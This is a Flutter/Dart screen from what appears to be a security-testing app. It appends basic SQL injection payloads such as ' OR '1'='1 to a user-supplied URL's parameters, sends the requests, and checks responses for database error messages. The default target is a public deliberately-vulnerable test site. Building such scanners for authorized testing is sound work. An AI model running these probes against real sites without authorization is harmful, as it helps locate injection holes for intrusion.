import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import '../theme.dart';
import '../services/localization_service.dart';

class PantallaSQLi extends StatefulWidget {
  const PantallaSQLi({super.key});
  @override
  State<PantallaSQLi> createState() => _PantallaSQLiState();
}

class _PantallaSQLiState extends State<PantallaSQLi> {
  final _urlCtrl = TextEditingController(
    text: "http://testphp.vulnweb.com/artists.php?artist=1",
  );
  final ScrollController _scroll = ScrollController();
  String _log = "";
  bool _auditando = false;

  final List<String> _payloads = [
    "'",
    "\"",
    "1'",
    "1\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
  ];
  final List<String> _dbErrors = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark",
    "ORA-00933",
    "PostgreSQL query failed",
  ];

  @override
  void initState() {
    super.initState();
    _log = "${LanguageService().translate('sqli_waiting_log')}\n";
  }

  void _addLog(String t) {
    setState(() => _log += "$t\n");
    Future.delayed(const Duration(milliseconds: 50), () {
      if (_scroll.hasClients) _scroll.jumpTo(_scroll.position.maxScrollExtent);
    });
  }

  Future<void> _iniciarAuditoria() async {
    String urlBase = _urlCtrl.text.trim();
    if (!urlBase.contains("=")) {
      _addLog(LanguageService().translate('url_params_warning'));
      return;
    }
    setState(() {
      _auditando = true;
      _log = "${LanguageService().translate('sqli_starting_log')}\n";
    });

    for (String payload in _payloads) {
      if (!_auditando) break;
      String urlAtacada = "$urlBase$payload";
      _addLog("${LanguageService().translate('testing_log')} $payload");
      try {
        final response = await http.get(Uri.parse(urlAtacada));
        String body = response.body;
        bool vuln = false;
        for (String error in _dbErrors) {
          if (body.contains(error)) {
            _addLog(
              "${LanguageService().translate('vulnerable_log')} '$error'",
            );
            vuln = true;
            break;
          }
        }
        if (!vuln) _addLog(LanguageService().translate('safe_log'));
      } catch (e) {
        _addLog(LanguageService().translate('connection_error_log'));
      }
      await Future.delayed(const Duration(milliseconds: 500));
    }
    _addLog("\n${LanguageService().translate('finished_log')}");
    setState(() => _auditando = false);
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(20),
      child: Column(
        children: [
          Text(
            LanguageService().translate('sqli_title'),
            style: const TextStyle(
              color: Colors.redAccent,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 10),
          TextField(
            controller: _urlCtrl,
            decoration: InputDecoration(
              labelText: LanguageService().translate('target_url_label'),
              prefixIcon: const Icon(Icons.link),
            ),
          ),
          const SizedBox(height: 10),
          SizedBox(
            width: double.infinity,
            child: ElevatedButton.icon(
              onPressed: _auditando
                  ? () => setState(() => _auditando = false)
                  : _iniciarAuditoria,
              style: ElevatedButton.styleFrom(
                backgroundColor: _auditando ? Colors.grey : Colors.red,
                padding: const EdgeInsets.all(15),
              ),
              icon: Icon(_auditando ? Icons.stop : Icons.bug_report),
              label: Text(
                _auditando
                    ? LanguageService().translate('stop_button')
                    : LanguageService().translate('start_attack_button'),
              ),
            ),
          ),
          const SizedBox(height: 15),
          Expanded(
            child: Container(
              width: double.infinity,
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppTheme.cardColor,
                borderRadius: BorderRadius.circular(5),
                border: Border.all(color: Colors.red.withValues(alpha: 0.5)),
              ),
              child: SingleChildScrollView(
                controller: _scroll,
                child: Text(
                  _log,
                  style: const TextStyle(
                    fontFamily: "Courier",
                    color: AppTheme.primary,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}
